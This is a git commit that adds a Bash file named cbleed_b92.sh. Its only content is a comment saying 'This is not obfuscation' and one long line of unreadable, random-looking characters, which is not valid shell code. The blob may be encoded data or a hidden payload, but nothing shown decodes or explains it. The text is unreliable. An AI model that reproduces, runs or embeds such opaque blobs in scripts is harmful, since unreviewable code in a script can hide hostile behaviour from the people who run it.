a066eb900e6bddc28897a74abde271b4c720fcdb
Corvo <rodrigo-f-p@hotmail.com>
2025-07-08 14:10:19 -0300

    Create cbleed_b92.sh

---
+++ Code/Bash/cbleed_b92.sh
@@ -0,0 +1,3 @@
+# This is not obfuscation. Thanks.
+
+K}&[aJTd;#uU=c#+I)&Cn25#!}nA%|fr>7uI>>)zOd:/B]1?1v1kV]6IZ{;I+sUkHoSOO6ZL?/D(iz#B3<hSh3+wm&:!%|8q.&H]d>3n5Im/p4lOGh^dfha.hnv:;P!O1zS<l_T^/[qAojIh-==*lj5i40C2kn9eJXQfee*A?1i[l:^BFc_,ldaN*2m/p4JNI)9vbSd=W#j@Y6#C-G'@ld5Wrt8[A6!DG(_4ef6H$RxGjHUg6sS<l_Ym5St!Y0[CG(hTRLb#E|s=Y(1.E6#lvNcj/Upa%TG)E=^[e^3jOruY*|G3/iPf\7cHyuj.j.;_F#vjOYTcW'8mWuJPG(jwQ#5#QQh$km<RG)S\Q#13*!uU={9#0psVw][vt)trA(DcD9T1VE(sg6iXBf%:-F1fOT(u53ttX;gU9#_DZddn3f8kB3#4-FvjOT(usXQDiz#0He&lJ|,F$4qCWt6
